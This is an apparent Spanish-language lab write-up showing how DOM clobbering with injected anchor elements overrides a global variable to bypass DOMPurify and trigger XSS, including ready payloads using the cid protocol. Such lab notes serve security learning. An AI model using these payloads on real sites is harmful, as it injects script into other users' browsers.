# XSS mediante clobbering en el DOM

Tags: #XSS-DOM #JavaScript

```bash 
En este lab se analiza un caso avanzado de XSS basado en DOM Clobbering, donde el sitio intenta construir un objeto con una variable global utilizando un patrón inseguro: si la variable no existe, se asigna un valor por defecto. Este patrón se vuelve vulnerable cuando un atacante puede introducir elementos HTML con IDs y atributos específicos que sobrescriben esa variable global.

- DOMPurify: Es un desinfectante XSS ultrarápido, ultratolerante y exclusivo de COM para HTML, MathML y SVG.  


Notas:
	1. Este lab solo funciona en Chrome 
```

```javascript
// Código general en la página 

	<script src='/resources/js/domPurify-2.0.15.js'></script>
	<script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
	<script>loadComments('/post/comment')</script>


// Dentro de loadCommentsWithDomClobbering.js itera por comentarios para ir representando los datos y puede que se acontezca la inyección

let defaultAvatar = windows.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

// Se podría colocar lo siguiente 
	defaultAvatar.avatar = '0" onerror=alert(0)>//'   
	<img class="avatar" src="">
	<img class="avatar" src="0" onerror=alert(0)>//">
```

```javascript 
// Hacer lo siguiente en comentarios y despues publicar un comentario normal para que la primera inyección se aplique 
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="0&quot;onerror=alert(0)>//">


// domPurify permite el uso del protocolo 'cid' que no urlencodea las " 
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(0)>//">
```